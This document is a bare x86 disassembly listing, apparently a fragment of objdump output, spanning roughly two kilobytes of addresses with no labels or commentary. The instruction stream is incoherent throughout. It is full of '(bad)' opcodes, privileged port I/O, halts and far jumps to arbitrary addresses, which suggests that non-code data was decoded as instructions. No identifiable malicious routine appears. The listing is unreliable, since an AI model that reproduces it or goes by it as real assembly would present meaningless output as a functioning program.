  5359fa:	and    DWORD PTR [esi+eiz*2+0x4b],0xffffffa3
  5359ff:	jle    0x5359f6
  535a01:	pop    ds
  535a02:	loop   0x5359a7
  535a04:	daa    
  535a05:	pop    ebx
  535a06:	test   eax,0x868032ef
  535a0b:	in     eax,dx
  535a0c:	add    BYTE PTR [ebx+0x66],cl
  535a0f:	cwde   
  535a10:	lock popf 
  535a12:	adc    DWORD PTR [eax-0x586ad23d],esi
  535a18:	scas   al,BYTE PTR es:[edi]
  535a19:	es mov bh,0xb1
  535a1c:	sar    DWORD PTR [eax],cl
  535a1e:	xor    eax,0x8d736af5
  535a23:	into   
  535a24:	jae    0x535a8c
  535a26:	out    0xb8,eax
  535a28:	pusha  
  535a29:	push   eax
  535a2a:	out    0x61,al
  535a2c:	mov    ebx,0xeb0479b9
  535a31:	test   DWORD PTR [ecx-0x76],ebp
  535a34:	stos   DWORD PTR es:[edi],eax
  535a35:	mov    eax,0x87da951f
  535a3a:	cmp    al,0x5a
  535a3c:	and    BYTE PTR [esi],al
  535a3e:	into   
  535a3f:	hlt    
  535a40:	or     al,BYTE PTR [eax+0x5164fa13]
  535a46:	popf   
  535a47:	dec    eax
  535a48:	xchg   esi,eax
  535a49:	sahf   
  535a4a:	bnd jg 0x5359dc
  535a4d:	push   ss
  535a4e:	adc    al,0x43
  535a50:	xor    eax,0x591f653c
  535a55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  535a56:	mov    ch,0x4a
  535a58:	dec    eax
  535a59:	sbb    cl,0xb9
  535a5c:	push   eax
  535a5d:	(bad)  
  535a5e:	cs pop ecx
  535a60:	mov    bh,0x27
  535a62:	ins    BYTE PTR es:[edi],dx
  535a63:	fisubr DWORD PTR [edi]
  535a65:	iret   
  535a66:	mov    cl,0x1c
  535a68:	xor    edx,ebx
  535a6a:	fistp  WORD PTR [ebx]
  535a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  535a6d:	push   0x7910eec5
  535a72:	arpl   WORD PTR [ebx+0x77],si
  535a75:	inc    esi
  535a76:	lds    esp,FWORD PTR [esi-0x5b19341d]
  535a7c:	fisttp DWORD PTR [esi-0x566ecc70]
  535a82:	test   DWORD PTR [esi-0x20],esi
  535a85:	loopne 0x535aee
  535a87:	push   cs
  535a88:	jmp    0xf39e:0x4c03a85d
  535a8f:	outs   dx,BYTE PTR ds:[esi]
  535a90:	pop    ss
  535a91:	mov    ecx,DWORD PTR [edx-0x26]
  535a94:	pushf  
  535a95:	push   DWORD PTR [ecx-0x5d3696bf]
  535a9b:	(bad)  [edi]
  535a9d:	jne    0x535a28
  535a9f:	mov    al,BYTE PTR [esi-0x42]
  535aa2:	xor    BYTE PTR [ebx+eax*1+0x50e739e],ch
  535aa9:	inc    eax
  535aaa:	lods   al,BYTE PTR ds:[esi]
  535aab:	sbb    bl,BYTE PTR [ebx-0x67]
  535aae:	push   cs
  535aaf:	add    ch,BYTE PTR [edi]
  535ab1:	stc    
  535ab2:	jmp    0x145e:0x8ea84893
  535ab9:	in     al,dx
  535aba:	cld    
  535abb:	jl     0x535b32
  535abd:	cmp    al,0x6a
  535abf:	pop    es
  535ac0:	adc    eax,0x6d4a24dd
  535ac5:	rcr    ebx,0xab
  535ac8:	cmp    DWORD PTR [ebx+0x32],ebx
  535acb:	mov    ds:0x830d5c29,al
  535ad0:	dec    edi
  535ad1:	lds    edi,FWORD PTR [ebx-0xfb3acd9]
  535ad7:	scas   al,BYTE PTR es:[edi]
  535ad8:	cmp    DWORD PTR [ebx+0x20123bb8],edx
  535ade:	xor    ecx,esi
  535ae0:	(bad)  
  535ae1:	mov    al,0x23
  535ae3:	and    eax,0x84757885
  535ae8:	inc    ecx
  535ae9:	xor    BYTE PTR [edx+edx*4-0x1ac1dd10],bl
  535af0:	mov    esi,0xe51cae01
  535af5:	jg     0x535b4d
  535af7:	lds    edx,FWORD PTR [eax+0x7498fc3b]
  535afd:	shl    BYTE PTR [edi],0xaa
  535b00:	sub    ecx,DWORD PTR [edx+0x1beecfab]
  535b06:	cld    
  535b07:	sub    DWORD PTR [eax+0x2f],edx
  535b0a:	jnp    0x535b26
  535b0c:	push   esp
  535b0d:	scas   eax,DWORD PTR es:[edi]
  535b0e:	test   al,0x46
  535b10:	das    
  535b11:	test   al,0x2d
  535b13:	fsubrp st(5),st
  535b15:	fisttp DWORD PTR [eax-0x1239de0e]
  535b1b:	mov    ecx,0x992284ff
  535b20:	(bad)  
  535b21:	jecxz  0x535ab4
  535b23:	jl     0x535b48
  535b25:	mov    al,ds:0xcff217bf
  535b2a:	in     eax,0xcb
  535b2c:	adc    ecx,ebp
  535b2e:	add    BYTE PTR [ecx+edx*8+0x463dc3fd],ah
  535b35:	arpl   WORD PTR [ebp+0x2c944c8],di
  535b3b:	and    BYTE PTR [ebp+0x13],cl
  535b3e:	sub    ebx,DWORD PTR [ecx-0x59]
  535b41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  535b42:	and    DWORD PTR [edi+0x1da7a939],edi
  535b48:	dec    edx
  535b49:	push   edi
  535b4a:	xchg   DWORD PTR [ecx],edi
  535b4c:	add    ebp,edi
  535b4e:	xor    edx,DWORD PTR [edi-0x12]
  535b51:	sbb    dl,BYTE PTR [esi+0x50]
  535b54:	stc    
  535b55:	mov    edx,0x39a775c3
  535b5a:	stos   DWORD PTR es:[edi],eax
  535b5b:	divps  xmm4,XMMWORD PTR [edx]
  535b5e:	int    0xe3
  535b60:	jns    0x535b60
  535b62:	mov    ebx,0xe8e8a1a1
  535b67:	jge    0x535b80
  535b69:	or     al,0xc1
  535b6b:	and    DWORD PTR [edx-0x5ab48162],edi
  535b71:	popf   
  535b72:	shl    DWORD PTR [ecx+ebp*4],0xf0
  535b76:	into   
  535b77:	cmp    eax,0xaed71402
  535b7c:	xor    BYTE PTR [ecx+0x22],cl
  535b7f:	dec    esi
  535b80:	test   BYTE PTR [ecx+0xd],ch
  535b83:	lahf   
  535b84:	mov    dh,0xf2
  535b86:	das    
  535b87:	xchg   BYTE PTR [esp+edx*4],ch
  535b8a:	cdq    
  535b8b:	xchg   edi,eax
  535b8c:	sub    DWORD PTR [edi+ebx*4-0x5161ea7],ecx
  535b93:	jl     0x535b9b
  535b95:	repz aaa 
  535b97:	ret    
  535b98:	out    0xf9,eax
  535b9a:	cmp    ebp,edi
  535b9c:	adc    BYTE PTR [eax-0x68],ch
  535b9f:	out    0xc1,eax
  535ba1:	jae    0x535b4a
  535ba3:	sti    
  535ba4:	jbe    0x535b6b
  535ba6:	(bad)  [ecx]
  535ba8:	mov    eax,ds:0xb2e5f9f
  535bad:	sbb    DWORD PTR [ebx],edx
  535baf:	lds    ebx,FWORD PTR [esi+0x1f9a7043]
  535bb5:	loope  0x535ba6
  535bb7:	in     eax,dx
  535bb8:	mov    dh,0x37
  535bba:	out    dx,eax
  535bbb:	inc    esp
  535bbc:	outs   dx,DWORD PTR ds:[esi]
  535bbd:	inc    ebx
  535bbe:	mov    ah,0xa8
  535bc0:	cmp    edi,DWORD PTR [eax+0x2e]
  535bc3:	push   0x7a3d5f1e
  535bc8:	mov    esi,0x2bafed52
  535bcd:	das    
  535bce:	rcr    DWORD PTR [esi+ebp*8],cl
  535bd1:	sti    
  535bd2:	lock adc eax,0x92b3d0c3
  535bd8:	dec    ecx
  535bd9:	cmp    al,0x61
  535bdb:	inc    edi
  535bdc:	cmp    ch,BYTE PTR [esi+0x4]
  535bdf:	mov    al,ds:0xbc64bc61
  535be4:	std    
  535be5:	pop    edi
  535be6:	inc    ebp
  535be7:	adc    dl,al
  535be9:	mov    esi,edi
  535beb:	jge    0x535c0c
  535bed:	pop    ds
  535bee:	sahf   
  535bef:	sub    al,0x81
  535bf1:	test   DWORD PTR [esi+0x6e1b83db],esp
  535bf7:	mov    dh,0x43
  535bf9:	xor    ch,BYTE PTR ds:0xdb283eb9
  535bff:	or     BYTE PTR [eax+0x633efe2d],ch
  535c05:	fdivr  DWORD PTR [edi-0x2]
  535c08:	pusha  
  535c09:	lock xor DWORD PTR [edx],esi
  535c0c:	jmp    0x4e3ea196
  535c11:	or     eax,0x207bc96f
  535c16:	inc    ebx
  535c17:	push   ecx
  535c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  535c19:	jl     0x535c2d
  535c1b:	or     dl,BYTE PTR [esi]
  535c1d:	pushf  
  535c1e:	sub    al,0xfd
  535c20:	popf   
  535c21:	push   ebp
  535c22:	es push esi
  535c24:	add    eax,DWORD PTR [ebx-0xe]
  535c27:	jns    0x535bdc
  535c29:	lods   eax,DWORD PTR ds:[esi]
  535c2a:	pop    edi
  535c2b:	cmp    al,0x49
  535c2d:	push   ebp
  535c2e:	imul   esi,DWORD PTR [esi],0x28
  535c31:	push   ebp
  535c32:	test   DWORD PTR [edi],ecx
  535c34:	pop    ebp
  535c35:	xchg   edx,eax
  535c36:	div    dl
  535c38:	sar    dh,1
  535c3a:	jl     0x535c39
  535c3c:	retf   0xf73c
  535c3f:	loopne 0x535c0b
  535c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  535c42:	pop    ebp
  535c43:	mov    ch,0x27
  535c45:	xor    BYTE PTR [edi+0x7ae122],0x29
  535c4c:	and    ah,ch
  535c4e:	push   edi
  535c4f:	clc    
  535c50:	stos   DWORD PTR es:[edi],eax
  535c51:	pop    esp
  535c52:	or     eax,0xfe39aca7
  535c57:	retf   
  535c58:	ret    0x5305
  535c5b:	adc    BYTE PTR [esi+0x233161f9],bh
  535c61:	inc    ecx
  535c62:	add    BYTE PTR [edi-0x39593bae],dh
  535c68:	and    dh,BYTE PTR [esi+0x1b]
  535c6b:	leave  
  535c6c:	(bad)  
  535c6d:	pop    eax
  535c6e:	cmp    eax,DWORD PTR [edi+0x23d57ed4]
  535c74:	or     al,0x74
  535c76:	cmp    dh,BYTE PTR [esi+0x65]
  535c79:	test   eax,0x10a2a46e
  535c7e:	imul   ecx,ebx,0xdff5d221
  535c84:	daa    
  535c85:	add    al,0xe7
  535c87:	loop   0x535c1f
  535c89:	sbb    al,0x10
  535c8b:	and    bl,ch
  535c8d:	or     esp,edx
  535c8f:	scas   eax,DWORD PTR es:[edi]
  535c90:	cmc    
  535c91:	jnp    0x535c2f
  535c93:	sbb    eax,0x6ed99a5e
  535c98:	jl     0x535c43
  535c9a:	adc    bh,dh
  535c9c:	(bad)  
  535c9d:	ds clc 
  535c9f:	jmp    0x535ce2
  535ca1:	mov    DWORD PTR [esi],edi
  535ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  535ca4:	(bad)  
  535ca5:	imul   ebp,DWORD PTR [ebx-0x7f41e95d],0xe71a6c2b
  535caf:	stos   BYTE PTR es:[edi],al
  535cb0:	inc    edi
  535cb1:	mov    edi,DWORD PTR [edx-0x59]
  535cb4:	rcl    dl,cl
  535cb6:	mov    esp,0xd0b20f87
  535cbb:	xchg   edx,ebx
  535cbd:	stc    
  535cbe:	(bad)  
  535cbf:	fidiv  DWORD PTR [edi+0x66]
  535cc2:	xor    DWORD PTR [edx],edi
  535cc4:	mov    cs,ecx
  535cc6:	jp     0x535d2b
  535cc8:	shl    DWORD PTR [edx-0x55],0xab
  535ccc:	xor    al,0x72
  535cce:	frstor [ebp-0x9]
  535cd1:	stc    
  535cd2:	ins    BYTE PTR es:[edi],dx
  535cd3:	sti    
  535cd4:	xchg   ebx,eax
  535cd5:	mov    esp,0x491122ac
  535cda:	inc    ebx
  535cdb:	aam    0x22
  535cdd:	jl     0x535c62
  535cdf:	xchg   DWORD PTR [edx],ebp
  535ce1:	inc    esp
  535ce2:	sbb    eax,0x5c30e78c
  535ce7:	mov    ds:0xb0c8504e,eax
  535cec:	adc    bl,BYTE PTR [ebx-0x3f]
  535cef:	sub    eax,0x4af77cb9
  535cf4:	cmp    eax,0xdc4c8963
  535cf9:	int    0x4d
  535cfb:	dec    edi
  535cfc:	ret    0x5364
  535cff:	mov    ds:0x9e2e769b,eax
  535d04:	xchg   edi,eax
  535d05:	(bad)  
  535d06:	pop    edx
  535d07:	mov    ds:0x99ad02b,eax
  535d0c:	sbb    eax,0x7398e575
  535d11:	xchg   esp,eax
  535d12:	mov    eax,0xe9979da7
  535d17:	mov    esp,0x39064bb2
  535d1c:	xchg   edi,eax
  535d1d:	lahf   
  535d1e:	dec    edx
  535d1f:	sbb    eax,0xeb0d591b
  535d24:	dec    ebx
  535d25:	adc    edi,DWORD PTR [ecx-0x65dd5047]
  535d2b:	das    
  535d2c:	clc    
  535d2d:	mov    bh,0xcc
  535d2f:	mov    cl,0x53
  535d31:	xor    eax,0x667fe636
  535d36:	ret    0xf33f
  535d39:	adc    eax,0x35c4c98a
  535d3e:	jge    0x535da6
  535d40:	out    dx,al
  535d41:	adc    eax,0x3f176913
  535d46:	pop    esi
  535d47:	push   ds
  535d48:	sub    eax,0xadcf06ad
  535d4d:	adc    BYTE PTR [edi],cl
  535d4f:	adc    DWORD PTR [ebx+0x1c152d77],0xffffffb2
  535d56:	call   0x3a2c5a86
  535d5b:	mov    ebx,0x6c697ab0
  535d60:	push   eax
  535d61:	mov    ebp,0x2fbf9c7
  535d66:	rcr    BYTE PTR [ecx-0x3b],cl
  535d69:	out    0xc8,eax
  535d6b:	jp     0x535d75
  535d6d:	repz cmp esp,DWORD PTR [ebx-0x5b44ed1b]
  535d74:	dec    esp
  535d75:	pop    esp
  535d76:	std    
  535d77:	add    cl,BYTE PTR [edx-0x4b]
  535d7a:	ds int3 
  535d7c:	xchg   ecx,eax
  535d7d:	mov    ebp,0x340e6217
  535d82:	std    
  535d83:	scas   al,BYTE PTR es:[edi]
  535d84:	xchg   esp,eax
  535d85:	cmp    ah,0x6a
  535d88:	in     eax,dx
  535d89:	push   eax
  535d8a:	sbb    al,0x6b
  535d8c:	push   ecx
  535d8d:	cmp    eax,0xecc70d92
  535d92:	mov    al,ds:0xe4f1cec9
  535d97:	dec    BYTE PTR [ebp+0x3ce91aa0]
  535d9d:	ss data16 fmul st(7),st
  535da1:	and    esi,ebx
  535da3:	push   cs
  535da4:	jbe    0x535e15
  535da6:	fmulp  st(6),st
  535da8:	add    DWORD PTR [edi+0x7d],ecx
  535dab:	enter  0x8601,0xe7
  535daf:	dec    edi
  535db0:	mov    cl,0x5c
  535db2:	xchg   edi,eax
  535db3:	cdq    
  535db4:	pop    edx
  535db5:	xor    al,0x82
  535db7:	out    0xb5,eax
  535db9:	aas    
  535dba:	in     eax,dx
  535dbb:	daa    
  535dbc:	xchg   BYTE PTR ss:[ebx],bh
  535dbf:	mov    edi,0xb497a618
  535dc4:	stc    
  535dc5:	nop
  535dc6:	and    eax,0x9c4cac92
  535dcb:	gs lahf 
  535dcd:	dec    eax
  535dce:	xor    al,0x28
  535dd0:	push   eax
  535dd1:	cwde   
  535dd2:	fisubr DWORD PTR [ecx+0x20]
  535dd5:	pop    ds
  535dd6:	pop    ecx
  535dd7:	jecxz  0x535da8
  535dd9:	into   
  535dda:	cmp    eax,0x99ee91cc
  535ddf:	lods   eax,DWORD PTR ds:[esi]
  535de0:	sub    DWORD PTR [eax],ecx
  535de2:	jae    0x535db0
  535de4:	jae    0x535e20
  535de6:	cmp    DWORD PTR [esi+0x74],ecx
  535de9:	lds    ebp,FWORD PTR [esi+ecx*1]
  535dec:	jg     0x535e6a
  535dee:	mov    al,ds:0x230f31c3
  535df3:	or     al,0x18
  535df5:	sbb    eax,0x8c08efd
  535dfa:	push   esp
  535dfb:	cmp    edi,ecx
  535dfd:	sbb    BYTE PTR [esi-0x32d51657],bl
  535e03:	lds    esp,FWORD PTR [esi]
  535e05:	inc    edx
  535e06:	and    ah,BYTE PTR cs:[edx+ecx*8-0x5d6b8ca8]
  535e0e:	jecxz  0x535e00
  535e10:	dec    edi
  535e11:	add    BYTE PTR [ecx*1+0x79cdc0c0],ah
  535e18:	adc    BYTE PTR [ecx+0x5],cl
  535e1b:	pop    esp
  535e1c:	pop    ebp
  535e1d:	sbb    ebp,esi
  535e1f:	or     edx,DWORD PTR [ecx-0x363b1832]
  535e25:	pop    edx
  535e26:	sub    al,0x1e
  535e28:	icebp  
  535e29:	push   edi
  535e2a:	xchg   edi,eax
  535e2b:	pop    ecx
  535e2c:	jl     0x535e33
  535e2e:	mov    WORD PTR [esi+ecx*4+0x188e919f],es
  535e35:	jle    0x535e50
  535e37:	fisttp QWORD PTR ds:0x4c9c0d39
  535e3d:	mov    ebp,0x940bfece
  535e42:	mov    edx,0xbe72cbdc
  535e47:	add    eax,DWORD PTR [ebx-0x3f4ae23a]
  535e4d:	jno    0x535e19
  535e4f:	xchg   edi,eax
  535e50:	out    0x63,eax
  535e52:	pop    ecx
  535e53:	inc    esi
  535e54:	enter  0x68da,0xcd
  535e58:	adc    ah,BYTE PTR [eax-0x7b675ee6]
  535e5e:	and    eax,0x7bbb1a19
  535e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  535e64:	adc    DWORD PTR ds:0xadab08df,esi
  535e6a:	mov    esi,0x61c78284
  535e6f:	xor    eax,0x78731c68
  535e74:	cmp    BYTE PTR [eax+0x59],al
  535e77:	mov    dl,0x8b
  535e79:	rcr    DWORD PTR [edx],cl
  535e7b:	and    ch,bh
  535e7d:	je     0x535e24
  535e7f:	jg     0x535e9c
  535e81:	dec    ebp
  535e82:	dec    esi
  535e83:	xchg   edx,eax
  535e84:	xor    al,0x74
  535e86:	leave  
  535e87:	bound  esp,QWORD PTR [esi-0x6bbef2f6]
  535e8d:	lds    ecx,FWORD PTR [edx+ecx*1]
  535e90:	test   BYTE PTR [ebp-0x26],bh
  535e93:	fwait
  535e94:	(bad)  
  535e95:	scas   al,BYTE PTR es:[edi]
  535e96:	and    BYTE PTR [edi+0x15],ah
  535e99:	lds    eax,FWORD PTR [esp+ebx*8]
  535e9c:	mov    ds:0x3c08d126,al
  535ea1:	jo     0x535f21
  535ea3:	jg     0x535e9d
  535ea5:	enter  0xb043,0x92
  535ea9:	int3   
  535eaa:	sub    eax,0x1d7bd951
  535eaf:	xor    cl,ch
  535eb1:	data16 js 0x535e5b
  535eb4:	mov    ds:0xc78ff9a3,al
  535eb9:	push   ss
  535eba:	pusha  
  535ebb:	fistp  QWORD PTR ds:0x1be2cd9a
  535ec1:	push   DWORD PTR [ecx-0x3e06ffb1]
  535ec7:	fsubr  DWORD PTR [esi+eax*4]
  535eca:	(bad)  
  535ecb:	(bad)  
  535ecc:	adc    BYTE PTR [eax+eiz*8],dh
  535ecf:	rcl    DWORD PTR [ecx+eiz*2],cl
  535ed2:	xlat   BYTE PTR ds:[ebx]
  535ed3:	inc    edi
  535ed4:	sar    ch,cl
  535ed6:	dec    edi
  535ed7:	clc    
  535ed8:	add    eax,0x87ecf883
  535edd:	cmp    ch,BYTE PTR ds:0xa85a0c5
  535ee3:	stc    
  535ee4:	xchg   esi,eax
  535ee5:	add    DWORD PTR [eax-0x6a],0xffffffcb
  535ee9:	imul   DWORD PTR [edx+0x47289fb4]
  535eef:	enter  0x6b37,0xb3
  535ef3:	das    
  535ef4:	or     eax,0xe1840f67
  535ef9:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  535efb:	add    esp,DWORD PTR [edx+0x2f8ce1cb]
  535f01:	fistp  DWORD PTR [edi+0x5a]
  535f04:	mov    WORD PTR [edx],fs
  535f06:	sar    BYTE PTR [edi-0x34],1
  535f09:	(bad)  
  535f0a:	cld    
  535f0b:	jmp    DWORD PTR [edi+0x178915b7]
  535f11:	out    0x3c,eax
  535f13:	test   BYTE PTR [esi-0x7747bbf6],bl
  535f19:	cwde   
  535f1a:	inc    edi
  535f1b:	into   
  535f1c:	add    DWORD PTR [ebx+0x70d8f54],ebx
  535f22:	dec    edi
  535f23:	popf   
  535f24:	inc    ebp
  535f25:	inc    ecx
  535f26:	popa   
  535f27:	aam    0x3d
  535f29:	jle    0x535f2c
  535f2b:	fs arpl bp,cx
  535f2e:	loop   0x535f6e
  535f30:	xor    ah,BYTE PTR [esi-0x11e5bdd6]
  535f36:	adc    esi,DWORD PTR [ebx-0x20]
  535f39:	jle    0x535fa3
  535f3b:	push   edx
  535f3c:	rcl    DWORD PTR [ebp+0x58],0x95
  535f40:	les    esi,FWORD PTR [edx-0x5fce5d4d]
  535f46:	retf   
  535f47:	mov    ds:0x5b00ce7d,al
  535f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  535f4d:	push   ebp
  535f4e:	push   ebx
  535f4f:	mov    ebp,0x33083c03
  535f54:	inc    edi
  535f55:	aas    
  535f56:	sbb    BYTE PTR [ebx],bh
  535f58:	dec    ebp
  535f59:	push   ecx
  535f5a:	sbb    edx,DWORD PTR [eax-0x75]
  535f5d:	jb     0x535f84
  535f5f:	xchg   edx,eax
  535f61:	inc    ebp
  535f62:	lods   al,BYTE PTR ds:[esi]
  535f63:	pop    edx
  535f64:	addr16 jle 0x535f69
  535f67:	das    
  535f68:	mov    BYTE PTR [edi],0x18
  535f6b:	shr    BYTE PTR [esi],1
  535f6d:	add    dl,dl
  535f6f:	mov    ds:0xddaf04af,eax
  535f74:	test   BYTE PTR [edi+0x52],0xe1
  535f78:	cmp    eax,edi
  535f7a:	ins    DWORD PTR es:[edi],dx
  535f7b:	xlat   BYTE PTR ds:[ebx]
  535f7c:	(bad)  
  535f7d:	add    esi,DWORD PTR [ecx-0x4357d720]
  535f83:	in     eax,dx
  535f84:	icebp  
  535f85:	test   al,0x29
  535f87:	idiv   BYTE PTR gs:[edi+eax*1]
  535f8b:	xchg   DWORD PTR [edx+0x7dc9975b],ebp
  535f91:	jecxz  0x535ff6
  535f93:	jmp    0x760a60b1
  535f98:	sbb    DWORD PTR [eax+ebx*8-0x33],ebp
  535f9c:	push   ebp
  535f9d:	sahf   
  535f9e:	mov    esi,0xc5ff489d
  535fa3:	in     al,dx
  535fa4:	pop    es
  535fa5:	mov    bl,0x1e
  535fa7:	xor    eax,0x9a239a8c
  535fac:	jl     0x535fa6
  535fae:	mov    DWORD PTR [ecx-0x2f],ebp
  535fb1:	mov    ah,0xc2
  535fb3:	retf   0x818f
  535fb6:	call   0x84cf6616
  535fbb:	test   eax,0xbd639402
  535fc0:	call   DWORD PTR [eax-0x3b8c9475]
  535fc6:	lahf   
  535fc7:	push   0xffffffb4
  535fc9:	fdiv   QWORD PTR [eax+ebx*4+0x9919ebc]
  535fd0:	ror    eax,cl
  535fd2:	cmp    ch,al
  535fd4:	cld    
  535fd5:	lods   eax,DWORD PTR ds:[esi]
  535fd6:	aad    0x74
  535fd8:	xor    al,0xf8
  535fda:	jne    0x535fe6
  535fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  535fdd:	(bad)  
  535fde:	sub    ebx,edx
  535fe0:	popf   
  535fe1:	cmp    BYTE PTR [edi+0x6c],bl
  535fe4:	cmp    eax,0x1fb22f62
  535fe9:	sti    
  535fea:	int3   
  535feb:	pusha  
  535fec:	push   eax
  535fed:	jmp    0x9ace:0x28617feb
  535ff4:	inc    edi
  535ff6:	dec    edx
  535ff7:	pop    ds
  535ff8:	ficomp WORD PTR [ebx+ecx*8]
  535ffb:	sti    
  535ffc:	stos   DWORD PTR es:[edi],eax
  535ffd:	popa   
  535ffe:	mov    dl,0xd1
  536000:	or     ebx,DWORD PTR [ebp+0x7d2ff028]
  536006:	xor    BYTE PTR [ebp-0x33326f5],bl
  53600c:	xor    BYTE PTR [esi-0x4a],cl
  53600f:	(bad)  
  536010:	popa   
  536011:	dec    esi
  536012:	ficom  WORD PTR [ebx+0x3292ed39]
  536018:	pop    esp
  536019:	xor    BYTE PTR [ecx],bh
  53601b:	inc    ebp
  53601c:	add    eax,0xa31b7d95
  536021:	or     edx,DWORD PTR [esi-0x74369e60]
  536027:	rol    DWORD PTR [ecx+0x29],cl
  53602a:	mov    ch,0x96
  53602c:	in     eax,dx
  53602d:	dec    edi
  53602e:	push   ebx
  53602f:	dec    esi
  536030:	das    
  536031:	fimul  DWORD PTR [edx]
  536033:	pop    ds
  536034:	jbe    0x536078
  536036:	push   ss
  536037:	xchg   edx,eax
  536038:	icebp  
  536039:	add    al,0x6b
  53603b:	retf   
  53603c:	daa    
  53603d:	mov    dl,0xbb
  53603f:	jle    0x536006
  536041:	dec    esi
  536042:	mov    esp,0x92112375
  536047:	cmp    dh,dh
  536049:	mov    bh,0x58
  53604b:	in     al,dx
  53604c:	pop    ecx
  53604d:	pop    edx
  53604e:	aaa    
  53604f:	mov    edi,0x5794f32c
  536054:	jecxz  0x536045
  536056:	mov    ch,BYTE PTR [eax-0xd0fbe6b]
  53605c:	push   ebx
  53605d:	rcr    DWORD PTR [eax+0x3ccdfa82],cl
  536063:	icebp  
  536064:	stos   BYTE PTR es:[edi],al
  536065:	inc    esp
  536066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  536067:	xchg   ebp,eax
  536068:	push   esi
  536069:	mov    esi,0xe7c06df2
  53606e:	pop    ebp
  53606f:	cmp    eax,0x89068e24
  536074:	adc    cl,cl
  536076:	mov    al,ds:0x817b910e
  53607b:	sub    dl,cl
  53607d:	retf   
  53607e:	je     0x53606e
  536080:	retf   
  536081:	inc    eax
  536082:	fdivr  DWORD PTR [ebx]
  536084:	cmp    al,0x61
  536086:	mov    eax,ss:0x23f381d
  53608c:	and    BYTE PTR [ecx],bh
  53608e:	imul   edx,DWORD PTR [eax-0x56d1b06c],0x7a0b0116
  536098:	jp     0x5360f1
  53609a:	adc    ebp,eax
  53609c:	(bad)  
  53609d:	shl    DWORD PTR [esi+0x61649a9c],1
  5360a3:	ja     0x5360f9
  5360a5:	pop    ebx
  5360a7:	xor    ebx,DWORD PTR [eax+0x3b]
  5360aa:	xchg   ebx,eax
  5360ab:	sub    DWORD PTR [esi-0x1a61a2e9],esp
  5360b1:	mov    edi,0x7e4ff9ee
  5360b6:	or     BYTE PTR [ebp+0x68c754f5],ch
  5360bc:	(bad)
  5360bf:	jno    0x5360bd
  5360c1:	push   ecx
  5360c2:	mov    ds:0x262a65d3,eax
  5360c7:	mul    BYTE PTR [ebp+0x28]
  5360ca:	dec    eax
  5360cb:	adc    ebp,DWORD PTR [esp+eax*1]
  5360ce:	cmp    DWORD PTR [ecx+0x31],esp
  5360d1:	loopne 0x536084
  5360d3:	in     al,0x5c
  5360d5:	sbb    bh,ch
  5360d7:	xchg   ebx,eax
  5360d8:	stos   BYTE PTR es:[edi],al
  5360d9:	(bad)  
  5360da:	test   al,0xcd
  5360dc:	fmul   QWORD PTR [edx-0x7a]
  5360df:	pop    esi
  5360e0:	in     al,0x96
  5360e2:	imul   ebx,DWORD PTR [edi],0x45
  5360e5:	loopne 0x5360b8
  5360e7:	mov    ecx,0x5080e06a
  5360ec:	(bad)  
  5360ed:	test   eax,0x97ebb2d
  5360f2:	pop    ecx
  5360f3:	dec    esi
  5360f4:	push   edi
  5360f5:	adc    eax,ecx
  5360f7:	pusha  
  5360f8:	jo     0x53608c
  5360fa:	iret   
  5360fb:	sbb    DWORD PTR [esi-0x33cdff2e],edx
  536101:	push   esp
  536102:	out    dx,eax
  536103:	dec    eax
  536104:	jecxz  0x5360df
  536106:	inc    edx
  536107:	jae    0x53612c
  536109:	call   0x3222:0xabbac759
  536110:	push   ecx
  536111:	add    DWORD PTR [edi],ebx
  536113:	lods   al,BYTE PTR ds:[esi]
  536114:	cmp    eax,0xbff119a9
  536119:	mov    edi,0xae2f6de3
  53611e:	pop    ds
  53611f:	push   es
  536120:	inc    esi
  536121:	outs   dx,BYTE PTR fs:[esi]
  536123:	aas    
  536124:	adc    edi,ebx
  536126:	rol    BYTE PTR [esi-0x45],1
  536129:	cdq    
  53612a:	adc    al,0xc
  53612c:	mov    eax,esi
  53612e:	int    0x78
  536130:	mov    ds:0x683b3bc5,al
  536135:	(bad)  
  536136:	pop    edx
  536137:	test   DWORD PTR [eax],esi
  536139:	outs   dx,BYTE PTR ds:[esi]
  53613a:	push   cs
  53613b:	arpl   WORD PTR [edx+0x39],sp
  53613e:	push   0xffffffcc
  536140:	stos   DWORD PTR es:[edi],eax
  536141:	jecxz  0x5360d9
  536143:	cwde   
  536144:	cmp    dl,BYTE PTR [eax-0x6]
  536147:	fldcw  WORD PTR [eax]
  536149:	xchg   esi,eax
  53614a:	or     ebp,esi
  53614c:	(bad)  [esi-0x5693fd0a]
  536152:	dec    esp
  536153:	mov    dl,0x97
  536155:	fs xchg ecx,eax
  536157:	cld    
  536158:	imul   edi,DWORD PTR [edx-0x29773b01],0xffffff89
  53615f:	inc    ecx
  536160:	push   cs
  536161:	outs   dx,BYTE PTR ds:[esi]
  536162:	mov    dl,BYTE PTR [ebx+0x46d72787]
  536168:	dec    ebx
  536169:	add    BYTE PTR [ebp-0x23],bl
  53616c:	stos   DWORD PTR es:[edi],eax
  53616d:	icebp  
  53616e:	outs   dx,DWORD PTR ds:[esi]
  53616f:	mov    eax,ds:0x466d9d1e
  536174:	dec    ecx
  536175:	mov    BYTE PTR [ecx],bh
  536177:	ja     0x5361bd
  536179:	aad    0x43
  53617b:	adc    esp,DWORD PTR [edi+edx*8-0x3312c6b4]
  536182:	or     dl,ah
  536184:	es js  0x536174
  536187:	push   ss
  536188:	pop    edx
  536189:	cmp    al,0xe6
  53618b:	jp     0x53617c
  53618d:	and    al,BYTE PTR [ecx-0x6c]
  536190:	das    
  536191:	fdivr  DWORD PTR [ecx+0x4295f018]
  536197:	xor    DWORD PTR ds:0xcd6a9eb6,edx
  53619d:	inc    ecx
  53619e:	imul   ebp,DWORD PTR [ecx],0x1b8ee994
  5361a4:	stos   DWORD PTR es:[edi],eax
  5361a5:	cwde   
  5361a6:	je     0x5361ec
